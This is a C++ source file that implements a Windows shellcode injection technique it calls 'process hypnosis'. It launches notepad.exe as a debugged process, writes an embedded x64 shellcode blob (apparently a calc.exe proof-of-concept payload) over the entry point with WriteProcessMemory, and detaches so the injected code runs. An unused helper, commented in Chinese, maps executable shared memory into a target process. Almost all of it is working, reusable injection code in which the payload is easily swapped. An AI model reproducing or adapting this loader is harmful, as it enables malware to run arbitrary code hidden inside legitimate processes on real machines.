#include <iostream>
#include <windows.h>
#include <stdio.h>
#include <dbghelp.h>
#include <memoryapi.h>


#pragma comment(lib, "dbghelp.lib") 
#pragma comment(lib, "onecore.lib") 


unsigned char shellCode[] = { 0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
	0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52,
	0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0xE2, 0xED,
	0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88,
	0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48,
	0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0, 0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1,
	0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49,
	0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A,
	0x41, 0x58, 0x41, 0x59, 0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B,
	0x6F, 0x87, 0xFF, 0xD5, 0xBB, 0xF0, 0xB5, 0xA2, 0x56, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB, 0x47,
	0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x2E,
	0x65, 0x78, 0x65, 0x00 };

VOID MappingShellcodeToTargerProcess(HANDLE hProcess, LPVOID rmAddr, SIZE_T shellcodeSize)
{
	// 1. 创建一个共享内存区域（基于分页文件）
	HANDLE hMapping = CreateFileMappingW(
		INVALID_HANDLE_VALUE,       // 使用系统分页文件
		NULL,                        // 默认安全属性
		PAGE_EXECUTE_READWRITE,      // 可执行、可读写
		0,                          // 高 32 位大小
		shellcodeSize,               // 低 32 位大小
		NULL
	);

	if (hMapping == NULL) {
		printf("[Error] CreateFileMapping failed: %d\n", GetLastError());
		return;
	}

	// 2. 在当前进程映射视图
	LPVOID pLocalView = MapViewOfFile(
		hMapping,                    // 映射对象句柄
		FILE_MAP_WRITE,				// 可执行权限
		0, 0,                       // 偏移量
		shellcodeSize               // 映射大小
	);

	if (pLocalView == NULL) {
		printf("[Error] MapViewOfFile failed: %d\n", GetLastError());
		CloseHandle(hMapping);
		return;
	}

	// 3. 写入 shellcode
	memcpy(pLocalView, shellCode, shellcodeSize);

	// 4. 在目标进程中映射同一块内存
	// 注意：MapViewOfFile2 需要 Windows 8+，若需兼容旧版可用 NtMapViewOfSection
	LPVOID pRemoteView = NULL;
	// 需要对齐：地址向下舍入到最接近的 64k 边界。如果此参数为 NULL， 则系统选取基址。
	if (!MapViewOfFile2(
		hMapping,                    // 映射对象句柄
		hProcess,              // 目标进程
		0,                           // 额外选项
		rmAddr,              // 目标地址（NULL = 自动分配）
		0,                           // 偏移量
		shellcodeSize,               // 映射大小
		PAGE_EXECUTE_READ       // 内存保护
	)) {
		printf("[Error] MapViewOfFile2 failed: %d\n", GetLastError());
		UnmapViewOfFile(pLocalView);
		CloseHandle(hMapping);
		return;
	}

	// 5. 清理本地映射（目标进程的映射仍然有效）
	UnmapViewOfFile(pLocalView);
	CloseHandle(hMapping);
}

int processHypnosisExecute()
{
	LPDEBUG_EVENT DbgEvent = new DEBUG_EVENT();

	LPSTARTUPINFOW si = new STARTUPINFOW();
	si->cb = sizeof(STARTUPINFOW);

	LPPROCESS_INFORMATION pi = new PROCESS_INFORMATION();

	wchar_t cmdLine[] = L"C:\\Windows\\System32\\notepad.exe";

	if (CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, DEBUG_ONLY_THIS_PROCESS, NULL, NULL, si, pi)) {// Create new process with DEBUG_PROCESS flag.

		printf("[+] Process [DEBUG] created successfully - PID: %d\n", pi->dwProcessId);
	}
	else {
		printf("[+] Couldn't create process. Exiting...");
		return -1;
	}

	for (int i = 0; i < 7; i++)
	{
		if (WaitForDebugEvent(DbgEvent, INFINITE))
		{

			switch (DbgEvent->dwDebugEventCode)
			{

			case CREATE_PROCESS_DEBUG_EVENT:

				/* This event is triggered when the process is created. At this point, the main thread is Frozen (PsFreezeProcess)*/

				printf("[+] New Process Created - PID: %d\n", DbgEvent->dwProcessId);
				printf("[+] New Thread Created - TID: %d\n", DbgEvent->dwThreadId);
				printf("[+] Process lpStartAddress: 0x%08p\n", DbgEvent->u.CreateProcessInfo.lpStartAddress);
				printf("[+] Process Main Thread: 0x%08p\n\n", DbgEvent->u.CreateProcessInfo.hThread);

				break;
			case LOAD_DLL_DEBUG_EVENT:

				/* IMPORTANT: In this event, we call ReadProcessMemory (optionally) only to retrieve the names of the DLLs. However, this isn't
				necessary since NTDLL.dll is always the first library to be loaded in a Windows process (as it contains the Image Loader),
				followed by Kernel32.dll. Therefore, the first addresses are always NTDLL.dll and Kernel32.dll, respectively.
				*/

				/* Although we are retrieving these addresses from a remote process, it's worth noting that they are the same in all Windows
				processes because the operating system maps these libraries only once in the RAM.
				This occurs due to shared memory, which can be defined as memory that is visible to more than one process or that is present
				in more than one process's virtual address space.*/

				wchar_t imageName[MAX_PATH];

				PVOID remoteAddr;
				size_t dwRead;
				if (ReadProcessMemory(pi->hProcess, DbgEvent->u.LoadDll.lpImageName, &remoteAddr, sizeof(LPVOID), &dwRead))  // read 256 chars
				{
					printf("[+] DLL Remote Address: 0x%08p\n", remoteAddr);
					if (ReadProcessMemory(pi->hProcess, remoteAddr, imageName, MAX_PATH, &dwRead)) {
						printf("[+] DLL Name: %ls\n", imageName);
					}
				}
				printf("[+] DLL Base Address: 0x%08p\n", DbgEvent->u.LoadDll.lpBaseOfDll);
				printf("[+] DLL hFile: 0x%08p\n\n", DbgEvent->u.LoadDll.hFile);

				break;

			case CREATE_THREAD_DEBUG_EVENT:

				/*In this Event we retrieve general and important information related to new created threads.*/
				printf("[+] New Thread Created: 0x%08p\n", DbgEvent->u.CreateThread.lpStartAddress);
				printf("[+] New Thread Handle: 0x%08p\n", DbgEvent->u.CreateThread.hThread);
				printf("[+] New Thread ThreadLocalBase: 0x%08p\n\n", DbgEvent->u.CreateThread.lpThreadLocalBase);
				break;

			case EXCEPTION_DEBUG_EVENT:

				/* Reports an exception debugging event. This event is significant as it provides important information, such as the location
				where an exception occurred. */
				if (DbgEvent->u.Exception.ExceptionRecord.ExceptionCode == EXCEPTION_BREAKPOINT) {
					printf("[+] Breakpoint was successfully triggered.\n");
					printf("[+] Exception Address [RIP]: 0x%08p\n", DbgEvent->u.Exception.ExceptionRecord.ExceptionAddress);
					break;
				}
			}

			size_t writtenBytes;

			if (i == 6)
			{
				// MappingShellcodeToTargerProcess(pi->hProcess, DbgEvent->u.CreateProcessInfo.lpStartAddress, sizeof(shellCode));

				if (WriteProcessMemory(pi->hProcess, DbgEvent->u.CreateProcessInfo.lpStartAddress, shellCode, sizeof(shellCode), &writtenBytes))
				{
					printf("[+] Shellcode was successfully written [%lu bytes]\n\n", (unsigned long)writtenBytes);
					if (!DebugActiveProcessStop(pi->dwProcessId)) { // Once this API is called, the thread is unfrozen and it will continue its flow execution.
						std::cerr << "Failed to detach from the process, error: " << GetLastError() << std::endl;
						return -1;
					}


					std::cout << "[+] Successfully detached from the DEBUG process. Continuing the process' flow execution..." << std::endl;

				}
				else {
					printf("[!] Couldn't write shellcode! %d", GetLastError());
					return -1;
				}

			}

			ContinueDebugEvent(pi->dwProcessId, pi->dwThreadId, DBG_CONTINUE);
		}



	}


	SymInitialize(GetCurrentProcess(), NULL, TRUE);
	SYMBOL_INFO symbol;
	symbol.SizeOfStruct = sizeof(symbol);
	SymFromName(GetCurrentProcess(), "CreateRemoteThread", &symbol);
	printf("[+] CreateRemoteThread Address: 0x%08p\n\n", (LPVOID)symbol.Address);
	SymCleanup(GetCurrentProcess());

}